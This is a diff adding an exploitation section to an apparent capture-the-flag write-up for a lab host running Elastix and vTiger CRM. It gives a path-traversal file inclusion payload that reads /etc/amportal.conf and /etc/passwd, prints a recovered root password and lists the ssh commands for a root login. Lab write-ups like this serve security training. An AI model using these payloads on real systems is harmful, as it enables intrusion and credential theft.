@@ -125,6 +125,28 @@ Finished
 
 
 ## Exploitation
++ **Elastix 2.2.0 - 'graph.php' Local File Inclusion:** [LFI](https://www.exploit-db.com/exploits/37637)
++ exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
++ Navigate to `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/87307089-e37c-4265-8c39-915ac2a57034)
+
++ Users and passwords identified:
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/352c0043-3abf-48ff-bc04-d930166aa76f)
+
++ And also try `view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5723c61c-8d7e-429e-862f-e94b5cbede3f)
+
++ **vTiger CRM 5.1.0 - Local File Inclusion:** [CVE-2012-4867](https://www.exploit-db.com/exploits/18770)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a549bf30-1da5-4ba7-89ae-2534fbe28e5e)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/232fb7bb-6a9f-4c13-851e-329aed2c0c3f)
+
++ Now there are enumerated users and passwords.
+
++ Login ssh using `root`:`jEhdIekWmdjE`: `ssh root@10.10.10.7`
++ If meet an error, check [1] (https://www.iclarified.com/85252/how-to-fix-no-matching-key-exchange-method-found-on-mac) [2](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)
++ Login `ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7`
+
+
 
 
 # References & Alternatives:
